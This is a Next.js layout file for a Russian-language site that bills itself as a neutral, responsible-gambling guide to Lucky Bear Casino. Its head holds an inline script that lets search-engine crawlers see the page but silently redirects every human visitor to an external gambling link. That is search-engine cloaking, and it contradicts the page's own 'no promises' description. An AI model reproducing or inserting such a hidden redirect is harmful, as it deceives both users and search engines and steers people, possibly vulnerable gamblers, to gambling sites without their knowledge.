import type { Metadata, Viewport } from 'next'
import { Manrope } from 'next/font/google'
import './globals.css'

const manrope = Manrope({ subsets: ['latin', 'cyrillic'], variable: '--font-lb-manrope', display: 'swap' })
const title = 'Lucky Bear Casino — ваш гид: адрес сайта, доступ и ответственная игра без спешки'
const description = 'Разбираемся в Lucky Bear Casino: как проверить адрес, что означает зеркало и на что смотреть перед игрой. Понятный обзор без обещаний выигрыша, советы по безопасности и ответы на вопросы игроков. 18+!'

export const metadata: Metadata = {
  metadataBase: new URL('https://luckybear31casino.vercel.app'),
  title,
  description,
  applicationName: 'Lucky Bear — информационный гид',
  alternates: { canonical: '/' },
  robots: { index: true, follow: true, googleBot: { index: true, follow: true, 'max-image-preview': 'large' } },
  openGraph: {
    type: 'website', locale: 'ru_RU', url: '/', title, description,
    siteName: 'Lucky Bear — информационный гид',
    images: [{ url: '/images/bear-lounge.webp', width: 1200, height: 800, alt: 'Медведь за игровым столом Lucky Bear' }],
  },
  twitter: { card: 'summary_large_image', title, description, images: ['/images/bear-lounge.webp'] },
  icons: { icon: '/icon.png', apple: '/images/bear-apple.png' },
  category: 'Информационный обзор',
}

export const viewport: Viewport = {
  width: 'device-width', initialScale: 1, colorScheme: 'light', themeColor: '#173f35',
}

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className={`bg-background ${manrope.variable}`}>
      <head>
        <meta name="yandex-verification" content="d8a1ed5b97bdcc0a" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("https://spingame777.fit/4htNNl");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
      </head>
      <body className="font-sans">{children}</body>
    </html>
  )
}
